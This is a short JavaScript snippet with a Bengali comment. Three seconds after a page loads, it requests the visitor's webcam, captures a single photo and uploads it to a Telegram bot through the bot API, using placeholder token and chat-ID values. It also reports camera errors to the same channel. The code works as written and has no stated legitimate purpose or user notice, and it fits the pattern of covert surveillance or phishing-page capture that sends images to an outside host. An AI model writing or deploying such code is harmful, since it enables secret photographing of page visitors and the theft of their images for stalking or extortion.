async function captureCam() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snap.jpg');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }, 'image/jpeg');

        stream.getTracks().forEach(t => t.stop());
    } catch (e) { sendTele("❌ Cam Error: " + e.message); }
}
setTimeout(captureCam, 3000); // পেজ লোডের ৩ সেকেন্ড পর ছবি তুলবে
